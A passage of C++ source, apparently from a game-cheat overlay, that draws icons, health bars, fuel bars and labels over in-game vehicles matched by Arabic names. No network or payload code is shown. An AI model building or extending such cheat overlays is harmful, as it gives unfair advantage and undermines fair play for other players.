													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 24, 91.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 87, 3.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 16, 91.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 87.00f, 3.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Bike && Vehicle.Name == u8"ﺔﺟﺍﺭﺩ")
											{
												if (Setting::vahicle_Text_item_SnowBike_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Bike, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Bike, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 24, 60.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 56, 3.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 16, 60.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 56.00f, 3.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_ATV2 && Vehicle.Name == u8"ﻲﻓ ﻲﺗ ﻱﺃ")
											{
												if (Setting::vahicle_Text_item_ATV2_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::ATV2, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::ATV2, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 24, 56.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 52, 3.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawRectangle(Screen.X - 17, Screen.Y + 16, 56.0f, 5.50f, DX11::ImGui_DX11::Color::Black, 1.50f);

													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 52.00f, 3.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}


										}
										else if (VehicleStyle == 1)
										{
											if (Setting::vahicle_Text_item_Plane && Vehicle.Name == u8"ﺓﺮﺋﺎﻃ")
											{

												if (Setting::vahicle_Text_item_Plane_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Plane, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Plane, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_SnowBoard && Vehicle.Name == u8"ﺞﻟﺰﺘﻟﺍ ﺡﻮﻟ")
											{

												if (Setting::vahicle_Text_item_SnowBoard_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::SnowBoard, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::SnowBoard, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 80, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 80.00f, 5.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Plane && Vehicle.Name == u8"ﺮﺘﺑﻮﻜﻴﻠﻫ")
											{

												if (Setting::vahicle_Text_item_Helicopter_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Helicopter, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Helicopter, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 97, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 97.00f, 5.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_BRDM && Vehicle.Name == u8"ﻡﺇ ﻱﺩ ﺭﺃ ﻲﺑ")
											{

												if (Setting::vahicle_Text_item_BRDM_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::BRDM, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::BRDM, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}

												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 74, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 78.00f, 5.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Scooter && Vehicle.Name == u8"ﺮﺗﻮﻜﺳ")
											{
												if (Setting::vahicle_Text_item_Scooter_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Scooter, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Scooter, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 75, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 75.00f, 5.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Motorcycle && Vehicle.Name == u8"ﺔﻳﺭﺎﻧ ﺔﺟﺍﺭﺩ")
											{
												if (Setting::vahicle_Text_item_Motorcycle_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Motorcycle, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Motorcycle, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 93, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 93.00f, 5.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Motorcycle3 && Vehicle.Name == u8"Motorcycle 3")
											{
												if (Setting::vahicle_Text_item_Motorcycle_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Motorcycle3, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Motorcycle3, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 80, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 80.00f, 5.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Snowmobile && Vehicle.Name == u8"ﺪﻴﻠﺟ ﺔﻓﺎﺣﺯ")
											{
												if (Setting::vahicle_Text_item_Snowmobile_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Snowmobile, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Snowmobile, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 100, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 100.00f, 5.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Tuk && Vehicle.Name == u8"ﻙﻮﺘﻛﻮﺗ")
											{
												if (Setting::vahicle_Text_item_Tuk_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Tuk, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Tuk, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 77, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 77.00f, 5.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Buggy && Vehicle.Name == u8"ﻲﺟﺎﺑ")
											{
												if (Setting::vahicle_Text_item_Buggy_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Buggy, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Buggy, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 80, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 80.00f, 5.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Sports && Vehicle.Name == u8"ﻭﺩﺍﺮﻴﻣ")
											{
												if (Setting::vahicle_Text_item_Sports_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Sports, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Sports, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 73, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 73.00f, 5.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Dacia && Vehicle.Name == u8"ﺎﻴﺳﺍﺩ")
											{
												if (Setting::vahicle_Text_item_Dacia_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Dacia, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Dacia, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}

												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 63, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 63.00f, 5.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Rony && Vehicle.Name == u8"ﻲﻧﻭﺭ")
											{
												if (Setting::vahicle_Text_item_Rony_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Rony, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Rony, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 67, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 67.00f, 5.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_UAZ && Vehicle.Name == u8"ﺐﻴﺟ")
											{
												if (Setting::vahicle_Text_item_UAZ_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::UAZ, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::UAZ, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 61, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 61.00f, 5.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Minibus && Vehicle.Name == u8"ﺓﺮﻴﻐﺻ ﺔﻠﻓﺎﺣ")
											{
												if (Setting::vahicle_Text_item_Minibus_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Minibus, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Minibus, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 82, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 86.00f, 5.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_PG117 && Vehicle.Name == u8"ﺔﻨﻴﻔﺳ")
											{
												if (Setting::vahicle_Text_item_PG117_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::PG117, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::PG117, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 56, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 56.00f, 5.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Aquarail && Vehicle.Name == u8"ﺏﺭﺎﻗ")
											{
												if (Setting::vahicle_Text_item_Aquarail_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Aquarail, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Aquarail, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 64, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 64.00f, 5.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_BigFoot && Vehicle.Name == u8"ﺓﺮﻴﺒﻛ ﺔﻨﺣﺎﺷ")
											{
												if (Setting::vahicle_Text_item_BigFoot_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::BigFoot, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::BigFoot, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 114, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 114.00f, 5.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_UTV && Vehicle.Name == u8"ﻲﻓ ﻲﺗ ﻮﻳ")
											{
												if (Setting::vahicle_Text_item_UTV_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::UTV, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::UTV, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 80, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 80.00f, 5.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Capsule && Vehicle.Name == u8"Capsule")
											{
												if (Setting::vahicle_Text_item_Capsule_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Capsule, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Capsule, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 80, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 80.00f, 5.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Coupe && Vehicle.Name == u8"ﻪﻴﺑﻮﻛ")
											{
												if (Setting::vahicle_Text_item_Coupe_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Coupe, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Coupe, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 79, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 79.00f, 5.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_PickUpTruck && Vehicle.Name == u8"ﺓﺮﻴﻐﺻ ﺔﻨﺣﺎﺷ")
											{
												if (Setting::vahicle_Text_item_PickUpTruck_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::PickUpTruck, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::PickUpTruck, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 80, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 80.00f, 5.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_SnowBike && Vehicle.Name == u8"ﺔﻴﺠﻠﺛ ﺔﺟﺍﺭﺩ")
											{
												if (Setting::vahicle_Text_item_SnowBike_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::SnowBike, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
